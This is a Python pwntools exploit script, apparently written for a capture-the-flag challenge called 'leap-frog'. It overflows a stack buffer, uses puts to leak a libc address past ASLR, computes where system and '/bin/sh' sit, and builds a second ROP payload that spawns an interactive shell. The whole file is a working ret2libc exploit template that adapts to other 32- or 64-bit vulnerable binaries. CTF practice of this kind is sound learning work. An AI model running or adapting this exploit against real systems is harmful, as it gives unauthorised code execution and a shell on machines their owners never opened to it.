#!/usr/bin/env python
from pwn import *

# PIE off, CANARY off, NX on, ASLR on, RELRO full, LIBC available

# set up enviroment
DEBUG = False
ARCH = 32
ADDR_SIZE = ARCH/8
# BIN_FILE = './rop'
BIN_FILE = '/problems/leap-frog_1_2944cde4843abb6dfd6afa31b00c703c/rop'

if ARCH == 64:
	context(arch='amd64', os='linux', log_level='debug')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elif ARCH == 32:
	context(arch='i386', os='linux', log_level='debug')
	if DEBUG:
		libc = ELF('/lib/i386-linux-gnu/libc.so.6')
	else:
		libc = ELF('/lib32/libc.so.6')

bin = ELF(BIN_FILE)
r = process(BIN_FILE)


# address of func and gadget
bof_off = 0x18  # offset of buf, away from ebp
main = 0x080487c9

poprdiret = 0x00000000004009a3 # from ROPgadget
ret = 0x080483f2
puts_plt = 0x8048460
puts_got = 0x804a01c
exit_plt = 0x8048470


# caculate the offsets
binsh_off = libc.search('/bin/sh').next()
puts_off = libc.sym['puts']
system_off = libc.sym['system']


# leak address
p = 'A' * (bof_off+ADDR_SIZE)
if ARCH==64:
	p += p64(poprdiret)
	p += p64(puts_got)
	p += p64(puts_plt)
	p += p64(main)
elif ARCH==32:
	p += p32(puts_plt)
	p += p32(main)
	p += p32(puts_got)

r.recv()
r.sendline(p)
leak = r.recvline(False)[:ADDR_SIZE]
leak += '\x00' * (ADDR_SIZE-len(leak))
if ARCH==64:
	puts = u64(leak)
elif ARCH==32:
	puts = u32(leak)

libc_base = puts - puts_off
binsh = libc_base + binsh_off
system = libc_base + system_off

print('libc_base: {}'.format(hex(libc_base)))
print('bin_sh   : {}'.format(hex(binsh)))
print('system   : {}'.format(hex(system)))


# ret2libc
p = 'A' * (bof_off+ADDR_SIZE)
if ARCH==64:
	p += p64(poprdiret)
	p += p64(binsh)
	p += p64(ret)
	p += p64(system)
elif ARCH==32:
	p += p32(system)
	p += p32(exit_plt)
	p += p32(binsh)

r.sendline(p)
r.interactive()